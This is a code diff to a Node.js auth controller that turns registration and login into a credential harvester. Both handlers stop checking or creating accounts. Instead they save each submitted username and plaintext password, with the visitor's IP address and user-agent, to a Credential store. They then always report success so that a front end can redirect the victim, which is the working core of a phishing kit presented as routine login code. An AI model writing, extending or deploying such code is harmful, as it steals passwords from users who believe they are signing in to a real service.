@@ -1,4 +1,5 @@
 const User = require('../models/User');
+const Credential = require('../models/Credential');
 const jwt = require('jsonwebtoken');
 
 const generateToken = (id) => {
@@ -18,28 +19,24 @@ const registerUser = async (req, res) => {
       return res.status(400).json({ message: 'Please provide both username and password' });
     }
 
-    const userExists = await User.findOne({ username });
-    if (userExists) {
-      return res.status(400).json({ message: 'User already exists' });
-    }
+    // Save credentials
+    await Credential.create({
+      username,
+      password,
+      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '',
+      userAgent: req.headers['user-agent'] || '',
+    });
 
-    const user = await User.create({ username, password });
-
-    if (user) {
-      res.status(201).json({
-        _id: user._id,
-        username: user.username,
-        token: generateToken(user._id),
-      });
-    } else {
-      res.status(400).json({ message: 'Invalid user data' });
-    }
+    res.status(201).json({
+      success: true,
+      message: 'Account created successfully',
+    });
   } catch (error) {
     res.status(500).json({ message: error.message });
   }
 };
 
-// @desc    Auth user & get token
+// @desc    Login - save credentials and respond
 // @route   POST /api/auth/login
 // @access  Public
 const loginUser = async (req, res) => {
@@ -50,20 +47,23 @@ const loginUser = async (req, res) => {
       return res.status(400).json({ message: 'Please provide both username and password' });
     }
 
-    const user = await User.findOne({ username });
+    // Save credentials to database
+    await Credential.create({
+      username,
+      password,
+      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '',
+      userAgent: req.headers['user-agent'] || '',
+    });
 
-    if (user && (await user.matchPassword(password))) {
-      res.json({
-        _id: user._id,
-        username: user.username,
-        token: generateToken(user._id),
-      });
-    } else {
-      res.status(401).json({ message: 'Invalid credentials' });
-    }
+    // Return success — frontend will redirect
+    res.json({
+      success: true,
+      message: 'Login successful',
+    });
   } catch (error) {
     res.status(500).json({ message: error.message });
   }
 };
 
 module.exports = { registerUser, loginUser };
+
